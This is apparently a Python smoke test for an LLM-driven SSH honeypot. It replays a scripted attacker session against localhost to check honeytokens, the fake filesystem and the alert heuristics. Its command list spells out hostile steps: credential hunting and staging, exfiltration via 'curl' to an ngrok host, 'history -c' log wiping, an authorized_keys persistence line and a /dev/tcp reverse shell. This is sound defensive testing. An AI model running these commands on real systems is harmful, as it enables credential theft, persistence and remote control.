"""End-to-end smoke test: connect to the running honeypot, drive a session,
print the responses. Waits for the prompt before sending the next command,
so LLM-bound commands get the full time they need.

Run while `python run.py` is up.
"""
import asyncio
import io
import sys
import time

import asyncssh

# Windows consoles default to cp1252 and choke on box-drawing / accented chars
# that LM Studio sometimes emits. Force UTF-8 with replacement so we never
# crash mid-test on a display issue.
if hasattr(sys.stdout, "buffer"):
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")

# (command, max_seconds_to_wait_for_prompt_after)
COMMANDS = [
    # Cached/dynamic
    ("whoami", 3),
    ("pwd", 3),
    ("uname -a", 3),
    ("ls -la", 3),
    # Sim-bot presence — multi-user "lived-in" host
    ("who", 3),
    ("w", 3),
    ("uptime", 3),
    ("last -n 6", 3),
    # Honeytokens (instant + consistent)
    ("cat ~/.aws/credentials", 5),
    ("cat ~/.aws/credentials", 5),         # must equal previous
    ("cat ~/.gitconfig", 5),
    # --- VFS write/read flow ---
    ('echo "interesting findings" > ~/notes.md', 5),
    ("cat ~/.aws/credentials", 5),         # still the honeytoken, untouched
    ("cat ~/notes.md", 5),                 # the attacker's own write
    ('echo "more details" >> ~/notes.md', 5),
    ("cat ~/notes.md", 5),                 # appended
    ("touch /tmp/empty.txt", 5),
    ("cat /tmp/empty.txt", 5),             # empty
    # --- VFS-aware ls ---
    ("ls ~", 5),                           # shows notes.md among home entries
    ("ls -la ~/.aws", 5),                  # honeytoken files visible in subdir
    ("ls /tmp", 5),                        # shows empty.txt the attacker just touched
    ('echo "payload" > /tmp/payload.sh', 5),
    ("ls -la /tmp", 5),                    # payload.sh appears
    ("rm /tmp/payload.sh", 5),
    ("ls /tmp", 5),                        # payload.sh gone
    # Shadow a honeytoken (still works through the ls layer)
    ("rm ~/notes.md", 5),
    # --- System files (sim-bot fleet visible to attacker) ---
    ("cat /etc/passwd", 5),                        # shows jdoe + agarcia rows
    ("grep agarcia /etc/passwd", 5),               # confirms other user exists
    ("cat /var/log/auth.log", 5),                  # recent SSH logins
    ("find /etc -name passwd", 5),                 # system-file find
    # --- Shell builtins: classic attacker recon + exfil ---
    ('find /home/jdoe -name "id_rsa"', 5),         # MEDIUM: credential search
    ("grep -rl AKIA /home/jdoe", 5),               # confirms files containing AKIA
    ("cp /home/jdoe/.aws/credentials /tmp/exfil.txt", 5),  # stage to /tmp
    ("mv /tmp/exfil.txt /tmp/.hidden", 5),         # rename to hide
    ("ls -la /tmp", 5),                            # .hidden should appear
    ("mkdir /tmp/staging", 5),
    ("rmdir /tmp/staging", 5),
    # --- Advanced attacker behavior (round 4 heuristics) ---
    ("ssh db-prod-01", 5),                                # HIGH: lateral to decoy
    ("curl https://x.ngrok.io/$(whoami)", 5),             # HIGH: DNS exfil
    ("history -c", 5),                                    # HIGH: log tampering
    # Trigger plants EARLY so the next block can swallow them.
    ("sudo -l", 60),                                      # plants /etc/sudoers.d/zzz_compat
    ("mysql -u root -p", 60),                             # plants /etc/mysql/my.cnf
    # --- Closing the loop: planted decoys should now exist and be swallowable ---
    ("ls /etc/sudoers.d", 5),                             # zzz_compat now visible
    ("cat /etc/sudoers.d/zzz_compat", 5),                 # MEDIUM: decoy_swallowed
    ("cat /etc/mysql/my.cnf", 5),                         # contains M3taD4ta!2026
    # --- Escalation: sudo -i should now flip the session to "root" ---
    ("sudo -i", 60),                                      # LLM (just first time it's seen)
    ("whoami", 3),                                        # should be 'root' (cache+elevated)
    ("id", 3),                                            # uid=0 (cache+elevated)
    # --- Trigger remaining VFS-driven heuristics ---
    # SSH persistence attempt (CRITICAL alert)
    ('echo "ssh-rsa ATTACKER_KEY" >> ~/.ssh/authorized_keys', 5),
    # Honeytoken tamper (HIGH alert) — overwriting planted creds
    ('echo "STOLEN_TOKEN" > ~/.aws/credentials', 5),
    ("cat ~/.aws/credentials", 5),         # now shows STOLEN_TOKEN
    ("ls ~", 5),                           # notes.md gone, the rest still there
    # CRITICAL: reverse shell — last because it'd often kill the session in reality
    ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", 5),
    ("exit", 5),
]
PROMPT_TAIL = "$ "

async def main():
    print("connecting to 127.0.0.1:2222 ...", flush=True)
    async with asyncssh.connect(
        "127.0.0.1",
        port=2222,
        username="jdoe",
        password="hunter2",
        known_hosts=None,
        client_keys=None,
    ) as conn:
        proc = await conn.create_process(term_type="xterm", term_size=(80, 24))

        # Read banner + initial prompt
        await _read_until_prompt(proc, timeout=3.0, label="banner")

        for cmd, timeout in COMMANDS:
            print(f"\n>>> $ {cmd}", flush=True)
            t0 = time.time()
            proc.stdin.write(cmd + "\n")
            got_prompt = await _read_until_prompt(proc, timeout=timeout, label=cmd)
            elapsed = time.time() - t0
            print(f"    [{elapsed:.2f}s, prompt={'yes' if got_prompt else 'TIMEOUT'}]", flush=True)
            if cmd == "exit":
                break

        proc.close()
    print("\ndone.", flush=True)

async def _read_until_prompt(proc, timeout, label):
    """Read stdout until it ends with the prompt tail or timeout elapses."""
    deadline = asyncio.get_event_loop().time() + timeout
    buf = []
    while True:
        remaining = deadline - asyncio.get_event_loop().time()
        if remaining <= 0:
            break
        try:
            chunk = await asyncio.wait_for(proc.stdout.read(2048), timeout=min(remaining, 0.5))
        except TimeoutError:
            if buf and "".join(buf).rstrip(" ").endswith("$"):
                break
            continue
        if not chunk:
            break
        buf.append(chunk)
        sys.stdout.write(chunk)
        sys.stdout.flush()
        if "".join(buf).rstrip(" ").endswith("$"):
            return True
    return False

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (asyncssh.Error, OSError) as exc:
        print(f"smoke test failed: {exc}", file=sys.stderr)
        sys.exit(1)
